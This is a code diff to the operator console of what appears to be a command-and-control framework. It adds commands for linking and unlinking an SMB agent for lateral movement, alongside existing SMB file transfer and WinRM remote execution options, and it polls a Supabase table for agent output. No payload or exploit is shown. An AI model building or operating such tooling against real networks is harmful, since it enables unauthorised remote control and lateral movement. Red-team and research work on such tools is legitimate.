@@ -2,7 +2,6 @@ import time
 import itertools
 import os
 import subprocess
-import re
 import threading
 
 from .database import supabase, get_public_url
@@ -40,7 +39,7 @@ def check_for_completed_commands(command_id, hostname, printed_flag):
             if command_info['status'] == 'Failed':
                 print(f"\n\n{RED}Error:{RESET} Command failed on {GREEN}{hostname}{RESET}\n\n {output}")
             else:
-                print(f"\n\noutput from {GREEN}{hostname}{RESET}\n\n {output}\n")
+                print(f"\n\nOutput from {GREEN}{hostname}{RESET}\n\n {output}\n")
             printed_flag.set()
         return True
     return False
@@ -55,6 +54,14 @@ def background_check(command_id, hostname, completed_event, printed_flag):
 
 def send_command_and_get_output(hostname, username, command_mappings, current_sleep_interval):
     """Interactively send commands to a host and print the output."""
+    linked_smb_ip = None
+
+    def get_prompt():
+        if linked_smb_ip:
+            return f"{LIGHT_GREY}{username}{RESET} ({GREEN}{hostname}{RESET}::{RED}{linked_smb_ip} SMB{RESET}) ~ "
+        else:
+            return f"{LIGHT_GREY}{username}{RESET} ({GREEN}{hostname}{RESET}::{BLUE}{external_ip}{RESET}) ~ "
+
     print(f"\nYou are now interacting with '{GREEN}{hostname}{RESET}'. Type 'exit' or 'help' for options.")
     print(f"Commands are being issued by user: {username}")
 
@@ -63,7 +70,7 @@ def send_command_and_get_output(hostname, username, command_mappings, current_sl
 
     while True:
         timestamp = time.strftime("%H:%M:%S")
-        prompt = f"{LIGHT_GREY}{username}{RESET} ({GREEN}{hostname}{RESET}::{BLUE}{external_ip}{RESET}) ~ "
+        prompt = get_prompt()
         command_text = input(prompt).strip().lower()
 
         # Check for empty command
@@ -93,6 +100,8 @@ def send_command_and_get_output(hostname, username, command_mappings, current_sl
             print("  smb write <local_file_path> <remote_smb_path> [username password domain]  :: Write a file to a remote host via SMB protocol")
             print("  smb get <remote_file_path> <local_file_path> [username password domain]  :: Get a file from a remote host via SMB protocol")
             print("  winrmexec <remote_host> <command> [username password domain]  :: Execute a command on a remote host via WinRM")
+            print("  link smb agent <ip_address>       :: Link the SMB agent to the current host using the specified IP address")
+            print("  unlink smb agent <ip_address>     :: Unlink the SMB agent from the current host using the specified IP address")
             print("  kill                              :: Terminate the agent")
             print("  exit                              :: Return to main menu\n")
             continue
@@ -273,6 +282,25 @@ def send_command_and_get_output(hostname, username, command_mappings, current_sl
                 print(f"{RED}Error:{RESET} {e}")
                 continue  # Prevent erroneous commands from being processed further
 
+        # Handle 'link smb agent <ip_address>' command
+        elif command_text.startswith("link smb agent"):
+            parts = command_text.split(maxsplit=3)
+            if len(parts) != 4:
+                print(f"{RED}Error:{RESET} Invalid link smb agent command format. Use 'link smb agent <ip_address>'.")
+                continue
+            linked_smb_ip = parts[3]
+            command_text = f"link smb agent {linked_smb_ip}"
+
+        # Handle 'unlink smb agent <ip_address>' command
+        elif command_text.startswith("unlink smb agent"):
+            parts = command_text.split(maxsplit=3)
+            if len(parts) != 4:
+                print(f"{RED}Error:{RESET} Invalid unlink smb agent command format. Use 'unlink smb agent <ip_address>'.")
+                continue
+            if linked_smb_ip == parts[3]:
+                linked_smb_ip = None
+            command_text = f"unlink smb agent {parts[3]}"
+
         # Translate using command mappings
         command_text = command_mappings.get(command_text, command_text)
 
@@ -356,7 +384,6 @@ def send_command_and_get_output(hostname, username, command_mappings, current_sl
             response = supabase.table('py2').select('status', 'output').eq('id', command_id).execute()
             command_info = response.data[0]
 
-
             # Check for command completion or failure
             if command_info['status'] in ('Completed', 'Failed'):
                 completed_event.set()
@@ -365,7 +392,7 @@ def send_command_and_get_output(hostname, username, command_mappings, current_sl
                     if command_info['status'] == 'Failed':
                         print(f"\n\n{RED}Error:{RESET} Command failed on {GREEN}{hostname}{RESET}\n\n {output}")
                     else:
-                        print(f"\n\noutput from {GREEN}{hostname}{RESET}\n\n {output}\n")
+                        print(f"\n\nOutput from {GREEN}{hostname}{RESET}\n\n {output}\n")
                     printed_flag.set()
                 break  # Exit loop when command is done
 
